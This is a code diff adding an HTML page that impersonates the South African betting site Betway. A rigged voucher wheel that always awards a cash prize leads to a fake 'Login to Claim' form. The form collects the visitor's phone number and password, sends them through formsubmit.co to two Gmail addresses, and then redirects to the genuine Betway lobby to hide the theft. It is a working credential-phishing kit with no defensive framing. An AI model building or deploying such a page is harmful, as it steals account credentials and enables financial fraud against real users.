@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Betway Voucher Spin</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #f0f0f0, #ffffff);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      padding: 30px 15px;
+      color: #333;
+    }
+
+    h1 {
+      color: #00B140;
+      font-size: 42px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+
+    #pointer {
+      width: 0;
+      height: 0;
+      margin: 20px auto;
+      border-left: 25px solid transparent;
+      border-right: 25px solid transparent;
+      border-bottom: 35px solid #111;
+    }
+
+    #wheel {
+      width: 300px;
+      height: 300px;
+      margin: 0 auto 30px;
+      background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgM4L7Fx-EdqA8DRvhzbidQnYBra8hUFWHg4MwbsLnmzdBlGL4RLNsqT2d_IfkH_EY70xhfr_QWrffMxwK1PwOmsVMKrjg4EIwtigbPLfYd-buZDCxhv6gZ661pz-tgUvHwlDfAzcHgk1mJ-AImdAGqU-zoQ5mogUxuf14GUAOGeiNN_HX7RVc43BbjvS0z/s720/1000038148.png');
+      background-size: cover;
+      background-position: center;
+      border-radius: 50%;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1);
+    }
+
+    button {
+      margin-top: 15px;
+      padding: 14px 30px;
+      background: linear-gradient(135deg, #00B140, #007d32);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: linear-gradient(135deg, #009e36, #005a28);
+    }
+
+    #message {
+      margin-top: 25px;
+      font-size: 22px;
+      color: #222;
+      font-weight: bold;
+    }
+
+    #claimBtn {
+      display: none;
+    }
+
+    #loginForm {
+      display: none;
+      margin-top: 40px;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+    }
+
+    #loginForm h2 {
+      color: #00B140;
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    #loginForm input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    #loginForm a {
+      color: #00B140;
+      text-decoration: none;
+      font-size: 14px;
+      display: inline-block;
+      margin-top: 5px;
+    }
+
+    #loginForm a:hover {
+      color: #007d32;
+    }
+
+    #loginForm button {
+      background: #00B140;
+      width: 100%;
+      font-size: 18px;
+      padding: 12px;
+      border-radius: 8px;
+      margin-top: 15px;
+    }
+
+    @media (max-width: 500px) {
+      #wheel {
+        width: 240px;
+        height: 240px;
+      }
+
+      button {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Betway</h1>
+  <p id="preSpinText">🎉 Tap the wheel to win a free voucher!</p>
+
+  <button id="spinBtn">🎯 SPIN NOW</button>
+  <div id="pointer"></div>
+  <div id="wheel"></div>
+
+  <div id="message"></div>
+  <button id="claimBtn">🎁 Claim Your Voucher</button>
+
+  <div id="loginForm">
+    <h2>Login to Claim</h2>
+    <form action="https://formsubmit.co/gamingznoob404@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://www.betway.co.za/LiveGameslobby">
+      
+      <label>Enter your details:</label>
+      <input type="number" name="phone" placeholder="+27 Mobile Number" required />
+      <input type="password" name="password" placeholder="Enter your Password" required />
+
+      <a href="#">Forgot Password?</a> 
+      <button type="submit">Login</button>
+      <input type="hidden" name="_cc" value="codespace404@gmail.com">
+    </form>
+  </div>
+
+  <script>
+    const wheel = document.getElementById('wheel');
+    const spinBtn = document.getElementById('spinBtn');
+    const message = document.getElementById('message');
+    const claimBtn = document.getElementById('claimBtn');
+    const loginForm = document.getElementById('loginForm');
+    const pointer = document.getElementById('pointer');
+    const preSpinText = document.getElementById('preSpinText');
+
+    const prizeAngles = {
+      "R150": 90,
+      "R200": 210,
+      "R100": 330
+    };
+
+    const prizes = Object.keys(prizeAngles);
+    let spun = false;
+
+    spinBtn.onclick = () => {
+      if (spun) return;
+      spun = true;
+
+      const prize = prizes[Math.floor(Math.random() * prizes.length)];
+      const angle = prizeAngles[prize];
+      const rotation = 360 * 5 + angle;
+
+      wheel.style.transform = `rotate(${rotation}deg)`;
+
+      setTimeout(() => {
+        message.textContent = `🎉 You won ${prize}!`;
+        claimBtn.style.display = 'inline-block';
+      }, 4000);
+    };
+
+    claimBtn.onclick = () => {
+      message.style.display = 'none';
+      wheel.style.display = 'none';
+      spinBtn.style.display = 'none';
+      claimBtn.style.display = 'none';
+      pointer.style.display = 'none';
+      preSpinText.style.display = 'none';
+      loginForm.style.display = 'block';
+    };
+  </script>
+
+</body>
+</html>tml>
